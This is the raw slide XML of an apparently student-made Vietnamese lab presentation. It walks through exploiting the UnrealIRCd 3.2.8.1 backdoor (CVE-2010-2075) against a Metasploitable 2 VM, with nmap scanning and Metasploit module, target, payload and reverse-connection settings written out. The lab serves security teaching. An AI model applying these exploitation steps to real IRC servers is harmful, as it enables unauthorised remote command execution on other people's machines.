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3" r:id="rId3"/>
    <p:sldId id="268" r:id="rId4"/>
    <p:sldId id="261" r:id="rId5"/>
    <p:sldId id="260" r:id="rId6"/>
    <p:sldId id="259" r:id="rId7"/>
    <p:sldId id="258" r:id="rId8"/>
    <p:sldId id="257" r:id="rId9"/>
    <p:sldId id="267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16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2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50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98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17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40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22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7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20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8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8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1191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170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76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00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467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5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C470F-C753-4722-B2FA-FDB19E0641A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5B83C-499E-4EB8-9BDF-13675C4FB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74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CE74-92CD-41FF-8693-4F7A340CC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3118" y="204827"/>
            <a:ext cx="8791575" cy="193852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UnrealIRCd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 3.2.8.1 Backdoor Command Execution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8D59C-4658-416C-9C21-8F9BEC601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0160" y="2666955"/>
            <a:ext cx="8791575" cy="1655762"/>
          </a:xfr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lâm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86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CE74-92CD-41FF-8693-4F7A340CC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595668"/>
            <a:ext cx="8791575" cy="72838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8D59C-4658-416C-9C21-8F9BEC601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477670"/>
            <a:ext cx="8791575" cy="4959706"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Tên</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> CVE: CVE-2010-2075</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0"/>
              <a:t>Mô tả:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t> Lỗ hổng này là một </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0"/>
              <a:t>backdoor (cửa hậu) độc hại</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t> đã được đưa vào mã nguồn của bản phân phối </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0"/>
              <a:t>UnrealIRCd 3.2.8.1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>. Backdoor này cho phép </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1" dirty="0"/>
              <a:t>kẻ tấn công từ xa thực thi các lệnh tùy ý</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t> trên máy chủ đang chạy ứng dụng UnrealIRCd bị ảnh hưởng.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Nguyên nhân: Mã độc được thêm vào trong macro DEBUG3_DOLOG_SYSTEM của mã nguồn.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Thời gian bị ảnh hưởng: Bản cài đặt nén (Unreal3.2.8.1.tar.gz) chứa backdoor đã được phân phối trên một số trang mirror (nhân bản) từ Tháng 11 năm 2009 đến ngày 12 tháng 6 năm 2010.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048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CE74-92CD-41FF-8693-4F7A340CC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595668"/>
            <a:ext cx="8791575" cy="72838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8D59C-4658-416C-9C21-8F9BEC601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477670"/>
            <a:ext cx="8791575" cy="4959706"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Ứng dụng bị ảnh hưởng:UnrealIRCd phiên bản 3.2.8.1 (được tải xuống trong khoảng thời gian trên).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Lỗ hổng chủ yếu ảnh hưởng đến các hệ thống Unix/Linux.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Mức độ khai thác: Rất nghiêm trọng, kẻ tấn công có thể giành được quyền truy cập và kiểm soát hoàn toàn máy chủ IRC bị ảnh hưởng.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Cách thức khai thác: Lỗ hổng này có thể được khai thác thông qua một module có sẵn trong các framework kiểm thử bảo mật như Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>(ví dụ: exploit/unix/irc/unreal_ircd_3281_backdoor).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450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CE74-92CD-41FF-8693-4F7A340CC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58408"/>
            <a:ext cx="8791575" cy="69180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8D59C-4658-416C-9C21-8F9BEC601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199693"/>
            <a:ext cx="8791575" cy="5142585"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ip </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> kali </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>linux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Ip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metasploitable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 2: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486402-E89E-4EDC-BAFB-4B28AB884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667" y="1199693"/>
            <a:ext cx="3881071" cy="2287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AFC820-2F57-4EE2-ACD5-9FE032F64F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821" y="3770985"/>
            <a:ext cx="3794761" cy="210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92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CE74-92CD-41FF-8693-4F7A340CC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90194"/>
            <a:ext cx="8791575" cy="468173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(Reconnaissance)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8D59C-4658-416C-9C21-8F9BEC601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980237"/>
            <a:ext cx="8791575" cy="5508345"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Quét Dịch vụ (Sử dụng Nmap): Quét để xác nhận cổng dịch vụ IRC (thường là 6667 hoặc 6697) đang mở và kiểm tra phiên bản.</a:t>
            </a:r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	</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> -p 6667 192.168.1.38</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="18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B13D6B-5222-4DDF-8295-E15FE718E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915" y="2314428"/>
            <a:ext cx="7840169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37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CE74-92CD-41FF-8693-4F7A340CC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237224"/>
            <a:ext cx="8791575" cy="477837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Metasploit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8D59C-4658-416C-9C21-8F9BEC601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965605"/>
            <a:ext cx="8791575" cy="5574183"/>
          </a:xfrm>
        </p:spPr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msfconsole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vi-VN" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Chọn Module Khai thác: Sử dụng module được thiết kế riêng cho lỗ hổng backdoor này</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt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D17977-2A2A-4D09-8EB5-7C52E656A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346" y="910153"/>
            <a:ext cx="3199696" cy="1915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7F6B3A-1DF9-47BD-8948-728239FBD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463" y="3565702"/>
            <a:ext cx="5468113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12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88D59C-4658-416C-9C21-8F9BEC601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497434"/>
            <a:ext cx="8791575" cy="5925312"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p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(Options):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	show options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Payload</a:t>
            </a:r>
          </a:p>
          <a:p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IP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(RHOSTS):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set RHOSTS 192.168.1.38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F2F144-1DB2-42BD-9794-488D8DF34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915" y="953500"/>
            <a:ext cx="6256646" cy="21920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7720AE-CB47-4696-94BB-0D0CF9AA37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710" y="4569799"/>
            <a:ext cx="6277851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960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88D59C-4658-416C-9C21-8F9BEC601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205" y="226771"/>
            <a:ext cx="11133733" cy="6422746"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Đặt Cổng Mục tiêu (RPORT):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Cổng mặc định của module này là 6667, nhưng kiểm tra lại bằng lệnh show options. Nếu Nmap trả về cổng khác, thiết lập lại.</a:t>
            </a:r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	set RPORT 6667</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Chọn Payload và Thiết lập Kết nối Ngược: Sử dụng payload dòng lệnh ngược phổ biến nhất cho Unix.</a:t>
            </a:r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	set PAYLOAD </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>cmd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>unix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>/generic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LHOST: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Địa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chỉ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>của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máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> Kali Linux </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>của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bạn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>	set LHOST 192.168.1.36</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>LPORT: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>Cổng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lắng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nghe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>ví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dụ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>: 4444).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>	set LPORT 4444</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr>
              <a:t>SETUP CMD:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="+mj-lt"/>
              </a:rPr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BDF707-2D52-4EF0-A26A-4BBECA178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661" y="992025"/>
            <a:ext cx="5353797" cy="323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66219C-C5B9-496C-AC8C-A7696CAC6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988" y="1745923"/>
            <a:ext cx="6296904" cy="333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6F3888-4FE4-43F0-84FB-ACDDBE08AA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10" y="2956921"/>
            <a:ext cx="5725324" cy="2857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A836DC-891F-4E8B-81CD-3667703DD9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776" y="3811404"/>
            <a:ext cx="5287113" cy="314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5EB954-9E9E-409B-B8BB-092FA9B524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45" y="4898724"/>
            <a:ext cx="4944165" cy="3810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EE9C8C-6A34-44B7-8D7F-8C9AA19BD7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629" y="4879974"/>
            <a:ext cx="5487166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287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88D59C-4658-416C-9C21-8F9BEC601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598" y="212141"/>
            <a:ext cx="11477548" cy="6020409"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Xem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> setup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:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	show options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6DE030-7DFB-49D6-9F9E-43FD622FF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330" y="270808"/>
            <a:ext cx="6105156" cy="2454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0CD47E-54E7-4BB3-9CAE-65D1A242F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44" y="3750633"/>
            <a:ext cx="5650590" cy="226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04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CE74-92CD-41FF-8693-4F7A340CC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295746"/>
            <a:ext cx="8791575" cy="72106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8D59C-4658-416C-9C21-8F9BEC601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382573"/>
            <a:ext cx="8791575" cy="5054803"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Exploit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cmd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metasploiable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 2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,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cmd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6DF18A-8421-43CD-883C-05A5485E4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566" y="2486779"/>
            <a:ext cx="8659433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251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444</TotalTime>
  <Words>499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Times New Roman</vt:lpstr>
      <vt:lpstr>Tw Cen MT</vt:lpstr>
      <vt:lpstr>Circuit</vt:lpstr>
      <vt:lpstr>Bài thực hành Tấn công UnrealIRCd 3.2.8.1 Backdoor Command Execution</vt:lpstr>
      <vt:lpstr>Giới thiệu:</vt:lpstr>
      <vt:lpstr>Giới thiệu:</vt:lpstr>
      <vt:lpstr>Thực hiện:</vt:lpstr>
      <vt:lpstr>Thăm dò (Reconnaissance)</vt:lpstr>
      <vt:lpstr>Khởi động Metasploit và Chọn Module</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Kết quả: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trung nguyen</dc:creator>
  <cp:lastModifiedBy>trung nguyen</cp:lastModifiedBy>
  <cp:revision>29</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-12-10T17:16:45Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-12-15T15:00:51Z</dcterms:modified>
</cp:coreProperties>
</file>